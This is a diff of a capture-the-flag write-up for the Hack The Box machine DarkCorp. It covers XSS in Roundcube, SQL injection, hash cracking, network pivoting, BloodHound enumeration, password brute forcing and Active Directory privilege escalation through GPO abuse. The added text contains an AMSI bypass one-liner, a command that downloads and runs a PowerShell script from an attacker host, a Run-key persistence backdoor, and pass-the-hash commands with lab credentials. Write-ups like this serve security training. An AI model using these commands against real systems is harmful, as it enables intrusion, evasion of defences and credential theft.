@@ -1,5 +1,4 @@
-1,Recon
-port scan
+# Nmap
 ```
 PORT    STATE SERVICE       VERSION
 22/tcp  open  ssh           OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
@@ -24,15 +23,21 @@ Host script results:
 |_    Message signing enabled and required
 
 ```
-Page check 
+
+# Page check 
+**drip.htb**
 ![](images/Pasted%20image%2020250210161437.png)
 There is another sub-domain `mail.drip.htb` for `sign in` page
+
+**mail.drip.htb**
 ![](images/Pasted%20image%2020250210161625.png)
 Then we can register an account to login.
 ![](images/Pasted%20image%2020250213162438.png)
 When we successfully login to the dashboard, we can find the version of this service 
 `Roundcube Webmail 1.6.7`
 ![](images/Pasted%20image%2020250213162550.png)
+
+# CVE-2024-42009
 By searching the exploits of this service, we can find a XSS vulner here.
 ![](images/Pasted%20image%2020250213162805.png)
 Let's look at the default email headers and note the `drip.darkcorp.htb` domain :
@@ -171,6 +176,7 @@ try:
 except KeyboardInterrupt:
     print("\n[+] Stopping server.")
 ```
+
 Firstly, we can check the uid 3 message:
 ```
 Hey Bryce,
@@ -181,6 +187,7 @@ You can access the dashboard at dev-a3f1-01.drip.htb. Please note that you'll ne
 
 If you encounter any issues or have feedback, let me know so I can address them promptly.
 ```
+
 Then we can get the other sub-domain here `dev-a3f1-01.drip.htb` and we can access to forget password page, we need to submit the target email
 ![](images/Pasted%20image%2020250310113003.png)
 Then continue use the exploit script to get the message
@@ -196,6 +203,8 @@ You may reset your password here: http://dev-a3f1-01.drip.htb/reset/ImJjYXNlQGRy
 ![](images/Pasted%20image%2020250310115154.png)
 Then we can get into account of `bcase@drip.htb`
 ![](images/Pasted%20image%2020250310115427.png)
+
+# SQL-injection by bcase
 There is a obvious sql-injection here when I search `5001'`
 ![](images/Pasted%20image%2020250310124457.png)
 
@@ -298,8 +307,10 @@ Then we can get the hash of user `ebelford`
 From the crackstation, we can get the cracked hash `8bbd7f88841b4223ae63c8848969be86:ThePlague61780`
 
 Let's use ssh to connect it and then we can handle the shell as `ebelford`
+`ssh ebelford@10.10.11.54`   (`ebelford:ThePlague61780`)
 
-In the /var/backups directory we find backups from postgres from the database user:
+# Switch to user postgres
+In the `/var/backups` directory we find backups from `postgres` from the database user:
 ```
 $ ls -la /var/backups | grep postgres
 drwx------ 2 postgres postgres 4096 Feb 5 1252 postgres
@@ -369,6 +380,7 @@ drwx------ 2 postgres postgres 4096 Feb  5 12:52 .
 drwxr-xr-x 3 root     root     4096 Feb 11 08:10 ..
 -rw-r--r-- 1 postgres postgres 1784 Feb  5 12:52 dev-dripmail.old.sql.gpg
 ```
+
 Let's try to decrypt the old backup using the database password:
 ```
 gpg --homedir /var/lib/postgresql/.gnupg --pinentry-mode=loopback --passphrase '2Qa2SsBkQvsc' --decrypt /var/backups/postgres/dev-dripmail.old.sql.gpg > /var/backups/postgres/dev-dripmail.old.sql
@@ -400,7 +412,7 @@ ff02::2 ip6-allrouters
 ```
 
 We need to port forwarding into our local machine.
-Let's use sshuttle for forwarding:
+Let's use `sshuttle` for forwarding:
 Don't forget to add to /etc/hosts :
 `172.16.20.1 DC-01 DC-01.darkcorp.htb darkcorp.htb`
 `172.16.20.3 drip.darkcorp.htb`
@@ -409,9 +421,8 @@ Don't forget to add to /etc/hosts :
 sshuttle -r ebelford:'ThePlague61780'@drip.htb -N 172.16.20.0/24
 ```
 
-PS: SSHuttle forwards only TCP traffic by default
-sshuttle is mainly used to tunnel TCP traffic, and ICMP (the protocol used by the ping command) is not forwarded by default. Therefore, even if the tunnel is successfully established, the ping command may not be able to detect the connectivity of the target host through the tunnel.
-
+PS: sshuttle forwards only TCP traffic by default
+`sshuttle` is mainly used to tunnel TCP traffic, and ICMP (the protocol used by the ping command) is not forwarded by default. Therefore, even if the tunnel is successfully established, the ping command may not be able to detect the connectivity of the target host through the tunnel.
 
 Just in case, let's ping 172.16.20.2 :
 ```
@@ -429,14 +440,136 @@ nmap -sCTV -Pn -vvv 172.16.20.2
 ```
 Port 80
 ![](images/Pasted%20image%2020250312005548.png)
-Port 80, we can use the credentials of victor to login
+
+Port 5000, we can use the credentials of victor to login
 ![](images/Pasted%20image%2020250312005811.png)
 
-Let's partially use proxychains4 and dump the domain for Bloodhound:
+# Bloodhound by `victor`
+Let's partially use `proxychains4`:
 ```
-$ sshpass -p'ThePlague61780' ssh -o StrictHostKeyChecking=no -D 1080
-ebelford@drip.htb
+Remember your local /etc/hosts should be
+10.10.11.54 drip.htb mail.drip.htb dev-a3f1-01.drip.htb
+172.16.20.1 DC-01 DC-01.darkcorp.htb darkcorp.htb
+172.16.20.2 WEB-01 WEB-01.darkcorp.htb
+172.16.20.3 drip.darkcorp.htb
+
 $ sudo apt install proxychains4
 $ sudo nano /etc/proxychains4.conf
+
+/etc/proxychains4.conf
+dnat 10.10.14.17  172.16.20.1
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks5  127.0.0.1 1080
 ```
 
+Then set up ssh forwarding
+```
+sshpass -p'ThePlague61780' ssh -o StrictHostKeyChecking=no -D 1080 ebelford@drip.htb
+```
+
+There is a good way to `ntpdate` the timezone with `dc01` server
+```
+DATE_UTC=$(ssh ebelford@drip.htb "date -u +%Y-%m-%dT%H:%M:%S")
+sudo timedatectl set-timezone UTC
+sudo date -s "$DATE_UTC"
+```
+
+Finally collect bloodhound information
+```
+proxychains4 bloodhound-python -u victor.r@darkcorp.htb -p 'victor1gustavo@#' -dc dc-01.darkcorp.htb --dns-tcp -ns 172.16.20.1 --dns-timeout 10 -c ALL -d darkcorp.htb --zip
+```
+![](images/Pasted%20image%2020250718023355.png)
+The next conventional approach is to first obtain the website `172.16.20.2`'s only privilege, and then use `ntlmrelayx` attack to obtain the system privileges of the machine.
+```
+sudo impacket-ntlmrelayx -t ldaps://172.16.20.1 -debug -i -smb2support -domain
+darkcorp.htb
+```
+But I don't know why I can't run it successfully.
+
+Another non-optimal way is to brute force the password of `taylor.b.adm: !QAZzaq1`.
+```
+hydra -l taylor.b.adm -P /usr/share/wordlists/rockyou.txt -o test.log  -vV ldap3://172.16.20.1
+```
+
+Then we can get the shell as `taylor`
+# Elevate Privileges
+Then use the `PowerGPOAbuse.ps1` script to elevate privileges
+```
+*Evil-WinRM* PS C:\Users\taylor.b.adm\Documents> $a = [Ref].Assembly.GetTypes() | ?{$_.Name -like '*siUtils'};$b = $a.GetFields('NonPublic,Static') | ?{$_.Name -like '*siContext'};[IntPtr]$c =$b.GetValue($null);[Int32[]]$d = @(0xff);[System.Runtime.InteropServices.Marshal]::Copy($d, 0, $c, 1)
+
+*Evil-WinRM* PS C:\Users\taylor.b.adm\Documents> iex(New-Object Net.WebClient).DownloadString('http://10.10.14.17/PowerGPOAbuse.ps1')
+
+*Evil-WinRM* PS C:\Users\taylor.b.adm\Documents> Add-GPOGroupMember -Member 'taylor.b.adm' -GPOIdentity 'SecurityUpdates'
+True
+
+*Evil-WinRM* PS C:\Users\taylor.b.adm\Documents> Set-GPRegistryValue -Name "SecurityUpdates" -key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "backdoor" -Type String -Value "powershell -ExecutionPolicy Bypass -NoProfile -Command `"Add-LocalGroupMember -Group 'Administrators' -Member taylor.b.adm`""
+
+DisplayName      : SecurityUpdates
+DomainName       : darkcorp.htb
+Owner            : darkcorp\Domain Admins
+Id               : 652cae9a-4bb7-49f2-9e52-3361f33ce786
+GpoStatus        : AllSettingsEnabled
+Description      : Windows Security Group Policy
+CreationTime     : 1/3/2025 3:01:12 PM
+ModificationTime : 2/14/2025 5:30:20 PM
+UserVersion      : AD Version: 0, SysVol Version: 0
+ComputerVersion  : AD Version: 2, SysVol Version: 2
+WmiFilter        :
+
+*Evil-WinRM* PS C:\Users\taylor.b.adm\Documents> gpupdate /force
+Updating policy...
+
+Computer Policy update has completed successfully.
+
+User Policy update has completed successfully.
+```
+
+Attack intent:
+Bypass security software detection to ensure that subsequent downloaded malicious scripts (such as `PowerGPOAbuse.ps1`) will not be blocked.
+
+Download and load the `PowerGPOAbuse` script
+```
+iex(New-Object Net.WebClient).DownloadString('http://10.10.14.17/PowerGPOAbuse.ps1')
+```
+
+Add the user to the local administrator group via GPO
+```
+Add-GPOGroupMember -Member 'taylor.b.adm' -GPOIdentity 'SecurityUpdates
+```
+
+Implanting a persistent backdoor via a GPO registry key
+```
+Set-GPRegistryValue -Name "SecurityUpdates" -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "backdoor" -Type String -Value "powershell -Command `"Add-LocalGroupMember -Group 'Administrators' -Member taylor.b.adm`""
+```
+
+Force update of Group Policy
+```
+gpupdate /force
+```
+
+Then you can use `impacket-secretsdump` to get the hash and log in to the terminal
+```
+impacket-secretsdump darkcorp/taylor.b.adm:'!QAZzaq1'@darkcorp.htb
+```
+
+I will give you guys the hash here, because it's really hard to control
+```
+evil-winrm -i dc-01.darkcorp.htb -u "administrator" -H
+"fcb3ca5a19a1ccf2d14c13e8b64cde0f"
+```
+
+Finally, you can get the superuser shell.
+
+# Description
+
+I only want to describe this machine in one sentence.
+Its difficulty and knowledge coverage far exceed all the current AD domain environment machines. 
+
+This is a machine that can be regarded as a treasure. Under the premise of such complex various exploits, the stability of the machine can be guaranteed as much as possible. It can be called the best machine in Hackthebox, no doubt about it.
+
+It is well worth studying and reviewing again and again, and truly exceeds the complexity of pro lab.
+
+**This machine is not suitable for beginners, and even experts have to spend a lot of effort here.**
